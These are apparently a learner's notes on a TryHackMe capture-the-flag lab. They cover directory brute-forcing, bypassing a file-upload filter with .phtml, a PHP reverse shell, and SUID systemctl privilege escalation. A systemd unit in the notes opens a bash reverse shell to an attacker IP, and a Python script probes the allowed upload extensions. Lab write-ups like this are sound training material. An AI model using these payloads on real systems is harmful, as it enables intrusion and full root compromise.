# TRY HACK ME NOTES
> LAB : Vulversity
1. Reconnaissance  : Search active services on target system, OS, Versions
2. Bruteforce directories using gobuster to find any vulnerable entry points
     - /internal/ allowed to upload files
  
3. Check what kind of files are allowed to upload or can we execute those files
     - Use Burp or python script
     - We can upload .phtml
4. Upload a phpshell to server
5. Start a netcat session for phpshell and gain a non-privileged access
6. Persorm Linux Privilege excalation using SUID
  - How to search for all binaries with SUID bit set
   -  find / -perm -u=s -type f 2>/dev/null
   -  Identify a binary with root as owner
   -  Use https://gtfobins.github.io/gtfobins/systemctl/ to find how to exploit
   -  Created root.service with code:
   -    [Unit]
        Description=root
        
        [Service]
        Type=simple
        User=root
        ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<Attacker-IP-Address>/4242 0>&1'
        
        [Install]
        WantedBy=multi-user.target
    - Hosted file using python server
    - downloaded file to /tmp on target using wget
    - start a listner on attcker machine
    - enabled and started the service
    - We get a root access

 ISSUES: 
 1. curly quote V/S straight quote in bash command.

 2. Python script used to enumerate file extension allowed to upload:
================================================================
```
import requests
import os

ip = "<Server Ip Address >"
url = f"http://{ip}:3333/internal/index.php"

original = "index.php"
filename = "index"
extensions = [".php", ".php3", ".php4", ".php5", ".phtml"]

for ext in extensions:
    new_filename = filename + ext
    os.rename(original, new_filename)

    with open(new_filename, "rb") as f:
        files = {"file": f}
        r = requests.post(url, files=files)


        if "Extension not allowed" in r.text:
            print(f"{ext} extension not allowed")
        else:
            print(f"{ext} seems to be allowed??")

    original = new_filename
os.rename(new_filename, "index.php")
```
===============================================================



